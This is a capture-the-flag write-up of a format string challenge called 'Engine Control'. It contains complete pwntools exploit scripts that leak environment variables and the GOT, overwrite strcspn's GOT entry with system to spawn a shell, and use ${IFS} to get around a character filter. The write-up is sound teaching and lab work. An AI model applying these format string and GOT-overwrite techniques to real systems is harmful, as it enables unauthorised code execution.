# Engine Control

The overall description for the challenge is as follows:

*These space engines are super powerful. Note: the .py file is merely used as a wrapper around the binary. We did not put any vulnerabilities in the wrapper (at least not on purpose). The binary is intentionally not provided, but here are some properties:*
```
  Arch:     amd64-64-little
  RELRO:    Partial RELRO
  Stack:    Canary found
  NX:       NX enabled
  PIE:      No PIE (0x400000)
```

You were able to download a C file and a .py file.

This challenge actually included two parts, which I will be discussing separately. The first was relatively easy and worth 75 points, while the second was significantly more challenging and worth 300 points. Overall, this was a fun and creative pwn challenge that I would rate on the high end of medium difficulty for the category. 

**TL;DR Solution:** Solve part 1 by leaking the contents of addresses on the stack with the %s format specifier until you reach the environmental variables; the flag is stored in one of them. For part 2, write arbitrary addresses to the stack by carefully selecting stack addresses that are already present on the stack and that are also accessible with the format string vulnerability; you can use %n to then write arbitrary addresses to the stack. Then determine the likely location of GOT entries based on a locally-compiled version of the C code, dump and match the entries based on probable libc versions, and obtain a reliable libc leak. Then overwrite strcspn's GOT entry to the libc address of system, and pass in the string '/bin/sh' to get a shell. Since the python wrapper will still be filtering certain characters, use ${IFS} instead of spaces when issuing terminal commands to read the flag.

## General Information Gathering

Firstly, we need to look at what information we have available. When we connect to the remote instance, we seem to have a very simple program that asks for user input, then echos it back:
```
knittingirl@piglet:~/CTF/hacky_holidays$ nc portal.hackazon.org 17003
Command: aaaaaaaaaaa
Running command (aaaaaaaaaaa) now on engine.
Command:
```
The C source code adds a few more details; the input is taken from the user with fgets, and it can be up to 200 characters in length. The line "printf(i)" also indicates that we are dealing with a format string vulnerability.
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(void) {

 char i[200] = {0};
 setbuf(stdout, 0);

 printf("\033[1mCommand: \033[0m");

 while(fgets(i, 200, stdin)!=NULL) {
    i[strcspn(i,"\n")] = 0;

    if (strlen(i) > 0) {
	    printf("Running command (");
	    printf(i);
	    printf(") now on engine.\n");
    }

    printf("\033[1mCommand: \033[0m");
 }
}
```
The Python wrapper also provides a key piece of information. Basically, if we attempt to send any non-ascii characters to the remote instance, the line "Invalid input." will be returned, and nothing will be accomplished. This is going to make many types of format string exploit strategy more difficult, since we won't be able to write most addresses into our input.
```
...
while True:
    if not p.connected():
        l.close()

    inp = str_input()

    if any(c not in string.ascii_letters + string.digits + string.punctuation for c in inp):
        l.sendline("Invalid input.")
        p.sendline()
    else:
        p.sendline(inp)
```

My final note for this background section is that I would advise compiling the C source code locally to give yourself a test binary. I would recommend a compilation parameters something like "gcc engine.c -o engine_control -no-pie", which will at least give you checksec results like those provided. I also made the lucky guess of compiling it on an Ubuntu 18 VM, since that is a very common OS on which to run pwn challenges. This came in very handy later on.

## Part 1: Environmental Disaster

The description for this specific section is as follows:

*These new space engines don't have any regard for their environment. Hopefully you can find something useful.*

*Flag format: CTF{32-hex}*

### Background and Strategy:

There isn't anything in the source code suggesting some condition to be met in order to print off an alternative flag. However, the emphasis on environment in the challenge description and title seems significant, since environmental variables are sometimes used in binary exploitation, typically when you have access to the machine itself via ssh connection and can thereby store shellcode in one to execute during the exploit. Significantly, environmental variables are stored on the stack.

Next, we can send a simple format string payload to the remote server in order to see what exactly is getting leaked from the stack. The python script looks like this:
```
from pwn import * 

target = remote('portal.hackazon.org', 17003)

print(target.recvuntil(b'Command:'))

payload = b'%p' * 100
target.sendline(payload)
payload = b''

print(target.recvuntil(b'Command:'))
for i in range(100, 150):
	payload += b'%' + str(i).encode('ascii') + b'$p'
target.sendline(payload)
target.interactive()
```
And the result looks like this:
```
knittingirl@piglet:~/CTF/hacky_holidays$ python3 engine_control_writeup_1.py 
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (0x7ffeae166d300x7f9026a748c0(nil)0x110x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x70257025702570250x257025702570250x3b7cdb8b2d06fe000x7ffeae169590(nil)0x4008400x7f90266a8bf70x20000000000x7ffeae1695980x1000000000x400720(nil)0x644e6dbfdd6f19c80x4006100x7ffeae169590(nil)(nil)0x9bb33112e46f19c80x9b6e21eadab119c80x7ffe00000000(nil)(nil)0x7f9026a888d30x7f9026a6e6380x4e6cc(nil)(nil)(nil)0x4006100x7ffeae1695900x4006390x7ffeae1695880x1c0x10x7ffeae169e32(nil)0x7ffeae169e3b0x7ffeae169e4d0x7ffeae169e600x7ffeae169e760x7ffeae169e860x7ffeae169ec80x7ffeae169ee30x7ffeae169ef40x7ffeae169f130x7ffeae169f260x7ffeae169f350x7ffeae169f600x7ffeae169f6d0x7ffeae169f7a0x7ffeae169f900x7ffeae169fab0x7ffeae169fbf0x7ffeae169fda(nil)0x210x7ffeae1870000x100x178bfbff0x60x10000x110x640x30x4000400x40x380x50x90x70x7f9026a78000) now on engine.\n\x1b[1mCommand:'
[*] Switching to interactive mode
 Running command (p) now on engine.
Command: Running command (0x8(nil)0x90x4006100xb0x3e90xc0x3e90xd0x3e90xe0x3e90x17(nil)0x190x7ffeae1697890x1a(nil)0x1f0x7ffeae169fef0xf0x7ffeae169799(nil)(nil)(nil)0x7cdb8b2d06fe9e000xe43227369fe6f73b0x34365f3638788c(nil)(nil)(nil)(nil)(nil)%) now on engine.
Command: Running command (133$p(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)(nil)) now on engine.
Command: $  
```
### Writing the Exploit

Now, environmental variables, are located on the stack, and based on general familiarity with the typical stack base range in x86-64 binaries, the leaks starting with "0x7ffeae" are probably addresses on the stack. As a result, by using the %s specifier to read the contents pointed at by various addresses, we can check each one to see if it contains something interesting.

The easiest way to accomplish this is to just write a for loop that will try out every address, and timeout if I'm attempting to access a string for a non-address. The script is this:
```

from pwn import * 

for i in range(1, 130):
	target = remote('portal.hackazon.org', 17003)

	print(target.recvuntil(b'Command:'))
	payload = b'%' + str(i).encode('ascii') + b'$s'
	target.sendline(payload)
	print(target.recvuntil(b'Command:', timeout=1))
	target.close()
```
And a relevant section of the resulting output is this:
```
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (LC_ALL=en_US.UTF-8) now on engine.\n\x1b[1mCommand:'
[*] Closed connection to portal.hackazon.org port 17003
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (PWD=/home/user) now on engine.\n\x1b[1mCommand:'
[*] Closed connection to portal.hackazon.org port 17003
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (FLAG=CTF{5df83ee123b2541708d3913df8ee4081}) now on engine.\n\x1b[1mCommand:'
[*] Closed connection to portal.hackazon.org port 17003
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (SOCAT_PID=347) now on engine.\n\x1b[1mCommand:'
[*] Closed connection to portal.hackazon.org port 17003

```
As a result, the flag for this section is CTF{5df83ee123b2541708d3913df8ee4081}. It was accompanied by a wide variety of other environmental variable leaks. Now we can move on to the hard part!

## Part 2: Control the Engine:

The description for this section is as follows:

*Can you take control of the engine?*

*Flag format: CTF{32-hex}*

### Background and Strategy:

As a general rule of thumb, the way to get a full exploit with a format string vulnerability is to overwrite something; the simplest overwrite location is often GOT entries, which should be relatively simple since there is only partial RELRO and non PIE. For a more in-depth overview of why how the GOT works and why overwriting it helpful, see my writeup of Imaginary CTF's Speedrun challenge (https://github.com/knittingirl/CTF-Writeups/tree/main/pwn_challs/Imaginary_CTF/speedrun).

#### Writing Addresses to the Stack

However, there are some challenges to that approach with this specific challenge. Firstly, the python wrapper means that all of my user input must consist of printable ASCII characters. Typically, format string overwrites are performed by writing the address in bytes as part of the payload, carefully padding it out and calculating an offset, then leaking the contents and/or performing an overwrite. Most address will contain non-printable characters, hence the difficulty.

Fortunately, there is an alternative strategy that I have seen applied on occasions when the user's input is stored on the heap, which would present a similar issue since in that case, you can't write to the stack at all. However, you will typically get some stack addresses within your format string leak that point to other locations on the stack; as a result, if we write an address to that offset, it will write to the stack in a spot we can access with the format string, and we will be able leak from or write to an arbitrary address. Finding such addresses requires some degree of trial and error, but here is an illustration of how it works.

I ultimately found two spots that allowed for this type of write, one at offset 32 that wrote to offset 62, and one at offset 60 that wrote to 61. I found these offsets by using a combination of %s and %n on stack address offsets and noting changes. A simple python script to illustrate how this works is here:
```
from pwn import *

target = remote('portal.hackazon.org', 17003)

#Here is the before:
print(target.recvuntil(b'Command:'))
payload = b'%32$p%60$p%62$p%61$p'
target.sendline(payload)

#Writing to my first spot
print(target.recvuntil(b'Command:'))
payload = b'%100x%32$n'
target.sendline(payload)

#Writing to my second spot
print(target.recvuntil(b'Command:'))
payload = b'%120x%60$n'
target.sendline(payload)

#And the after:
print(target.recvuntil(b'Command:'))
payload = b'%32$p%60$p%62$p%61$p'
target.sendline(payload)

target.interactive()
```
And here is the terminal result. Please note that the hex equivalent of 100 is 0x60, and the hex equivalent of 120 is 0x78.
```
knittingirl@piglet:~/CTF/hacky_holidays$ python3 engine_control_writeup_2.py 
[+] Opening connection to portal.hackazon.org on port 17003: Done
b'\x1b[1mCommand:'
b' \x1b[0mRunning command (0x7ffffab518700x7ffffab518680x10x1c) now on engine.\n\x1b[1mCommand:'
b' \x1b[0mRunning command (                                                                                            fab4f010) now on engine.\n\x1b[1mCommand:'
b' \x1b[0mRunning command (                                                                                                                fab4f010) now on engine.\n\x1b[1mCommand:'
[*] Switching to interactive mode
 Running command (0x7ffffab518700x7ffffab518680x640x78) now on engine.
Command: $
```

Before moving on, I will briefly note that with this method, it is only really possible to write relatively small addresses to the stack, although there may be additional workarounds for this issue. This is because the %x trick is time-consuming as numbers grow larger, which is why typical format string overwrites break the process into smaller chunks. Fortunately, I only needed to write to GOT addresses in this case, and in a non-PIE, x86-64 binary, these are sufficiently small to end in a reasonable period of time.

#### So Where are these GOT Addresses?

Since this challenge did not grant us access to the actual binary, we don't really know for sure where the GOT entries are, particularly in terms of which offsets correspond to which functions. We can, however, make some educated guesses based on our locally-compiled binary (on Ubuntu 18.04). The GOT table shown here shows entries ranging from 0x601018 to 0x601040. 
```
gef➤  got

GOT protection: Partial RelRO | GOT functions: 6
 
[0x601018] puts@GLIBC_2.2.5  →  0x7fd70b6a8aa0
[0x601020] __stack_chk_fail@GLIBC_2.4  →  0x4005c6
[0x601028] setbuf@GLIBC_2.2.5  →  0x7fd70b6b05a0
[0x601030] printf@GLIBC_2.2.5  →  0x7fd70b68cf70
[0x601038] strcspn@GLIBC_2.2.5  →  0x7fd70b7b1fb0
[0x601040] fgets@GLIBC_2.2.5  →  0x7fd70b6a6c00

```
Now, an experiment with libc database search and leaking contents at those offsets directly showed that while this general area definitely seems to contain GOT entries, they did not seem to correspond perfectly with the order of functions in my local binary. At this point, I took inspiration from a specific LiveOverflow video (see here for full details https://www.youtube.com/watch?v=XuzuFUGuQv0), and basically attempted to leak out the full binary, or at least the code section, through my format string exploit. It didn't really work in terms of deriving a correct GOT table, so I won't go into it in too much detail here, but if you want to try it, just modify the approach I will describe below to start at the beginning of the code section, go on a lot longer, and write the results to a binary file. Binary Ninja Cloud is the only thing I've found that can even try to disassemble the results.

However, this process did give me an alternative idea. Based on the bounds in which my GOT entries should exist, I can just leak them all at once, relatively efficiently. Basically, the idea is to create a while loop starting at the beginning of the GOT region. You leak the contents of the address, write those contents plus a null byte (strings are null-terminated!) to a variable you're appending to, iterate i up by the length of this write, then overwrite the low byte of the address to the current value of i in order to check the next relevant address.
```
from pwn import *

target = remote('portal.hackazon.org', 17003)

#Be patient!
print(target.recvuntil(b'Command:'))
payload = b'%' + str(0x601000).encode('ascii') + b'x%32$n'
target.sendline(payload)

#Check that the address works
print(target.recvuntil(b'Command:'))
target.sendline(b'%62$p')

got_leak = b''

i = 0
while i < 0xa0:
	print(target.recvuntil(b'Command:'))
	target.sendline(b'%62$s')
	print(target.recvuntil(b'command ('))
	result = target.recvuntil(b') now').replace(b') now', b'')
	print(result)
	got_leak += result + b'\x00'
	i = i + len(result) + 1
		
	payload = b'%' + str(i).encode('ascii') + b'x%32$hhn'
	target.sendline(payload)
	print(target.recvuntil(b'Command:'))
	
print('My leaked got_leak is', got_leak)
```
The leaked GOT section is here:
```
My leaked got_leak is b'\xa0\xeaZ\xa6\xd1\x7f\x00\xb6\x05@\x00\x00\x00\x00\x00\x00\xa0e[\xa6\xd1\x7f\x00\x00p/Y\xa6\xd1\x7f\x00\x00\xb0\x7fk\xa6\xd1\x7f\x00\x00\x10\xfbT\xa6\xd1\x7f\x00\x00\x00\xccZ\xa6\xd1\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00`\xa7\x91\xa6\xd1\x7f\x00\x00\x00\x9a\x91\xa6\xd1\x7f\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
[*] Switching to interactive mode

```
Now we can unpack the addresses that look like libc leaks and attempt to derive libc version and specific entry addresses. This turned out to be easier than I had expected. When I unpacked '\xa0e[\xa6\xd1\x7f\x00\x00', at 0x601010, I got a hex value of 0x7fd1a65b65a0. Those last three digits are actually familiar from the GOT entries in my locally-compiled binary; it correspond with the setbuf function for the local library. In total, I derived the locations of four GOT entries with a high degree of confidence:
```
fgets_got_plt = 0x601030 
strcspn_got_plt = 0x601020
printf_got_plt = 0x601018
setbuf_got_plt = 0x601010
```
The relevant library can be downloaded from here: https://libc.blukat.me/?q=fgets%3Ac00%2Csetbuf%3A5a0%2Cprintf%3Af70

If you did not happen to debug on exactly the correct version of Ubuntu, it still would have been relatively easy to derive the correct version and offsets by testing libc addresses against each of the possible GOT functions until you made a plausible match.

### Writing the Exploit

With this information, we have the basis of a strong exploit. We know where the GOT entries are, and we are able to write to them and leak libc addresses from them. I will note right now that I struggled to make a onegadget work with as an overwrite to a GOT entry, so instead, I went the route of picking a function to overwrite where I would be able to pick the first parameter when it got called, allowing the execution of system(/bin/sh). If we revisit the C code, it looks like strcspn should work nicely, since it is called on the string input that is input immediately beforehand with fgets.
```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>


int main(void) {

 char i[200] = {0};
 setbuf(stdout, 0);

 printf("\033[1mCommand: \033[0m");

 while(fgets(i, 200, stdin)!=NULL) {
    i[strcspn(i,"\n")] = 0;

    if (strlen(i) > 0) {
	    printf("Running command (");
	    printf(i);
	    printf(") now on engine.\n");
    }

    printf("\033[1mCommand: \033[0m");
 }
}
```
Eventually, I was able to put all of this together into a single exploit script.
```
from pwn import * 

target = remote('portal.hackazon.org', 17003)

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
#                		      0x7ff1dbc4d432
#Gadgets:
fgets_got_plt = 0x601030 #Note that it ends in a null, so not a great traditional leak.
strcspn_got_plt = 0x601020
printf_got_plt = 0x601018
setbuf_got_plt = 0x601010

print(target.recvuntil(b'Command:'))
payload = b'%p' * 100
target.sendline(payload)

print(target.recvuntil(b'Command:'))

payload = b'%' + str(strcspn_got_plt).encode('ascii') + b'x%60$n' + b'%32$n'
target.sendline(payload)

print(target.recvuntil(b'Command:'))
payload = b'%61$s'
target.sendline(payload)
print(target.recvuntil(b'engine'))	
print(target.recvuntil(b'command ('))
result = target.recvuntil(b') now')
print(result)	
leak = result.replace(b') now', b'')
print(leak)

strcspn_libc = u64(leak + b'\x00' * (8-len(leak)))
print(hex(strcspn_libc))

#For some reason the offset of strcspn is a bit dodgy, using printf as a middleman was easiest.
printf_libc = strcspn_libc - 0x125040
print('printf libc is', hex(printf_libc))
libc_base = printf_libc - libc.symbols["printf"]
system = libc_base + libc.symbols["system"]
print("The system address is at", hex(system))



system_low_two = int(hex(system)[10:15], 16)
system_next_two = int(hex(system)[6:10], 16)

#This will let us overwrite the next lowest two bytes of strcspn's GOT entry.
payload = b'%' + str(0x20 + 2).encode('ascii') + b'x%32$hhn'

target.sendline(payload)
print(target.recvuntil(b'Command'))
payload = b'%' + str(system_low_two).encode('ascii') + b'x%61$hn'
#This took some trial and error.
if system_next_two > system_low_two:
	payload += b'%' + str(system_next_two - system_low_two).encode('ascii') + b'x%62$hn'
else:
	payload += b'%' + str(0xffff - system_low_two + system_next_two + 1).encode('ascii') + b'x%62$hn'


target.sendline(payload)
print(target.recvuntil(b'Command'))
target.sendline(b'/bin/sh')

target.interactive()

```
And the end of the terminal output looks like this:
```
                                                                                               c52198c0) now on engine.
Command: $ ls
engine    engine.py  you_are_an_amazing_hacker.txt

```
At this point, I had to deal with one final challenge. If I attempted the obvious in order to read the flag file, I got an "Invalid input" notice, since a space is one of the forbidden characters in the python wrapper.
```
$ cat you_are_an_amazing_hacker.txt
Invalid input.
```
Fortunately, after some Googling, I found a workaround and was finally able to print the flag!
```
$ cat${IFS}you_are_an_amazing_hacker.txt
CTF{4ffac46e926dcadeba7d365ff2b2a9af}

```
Thanks a lot for reading this lengthy writeup!
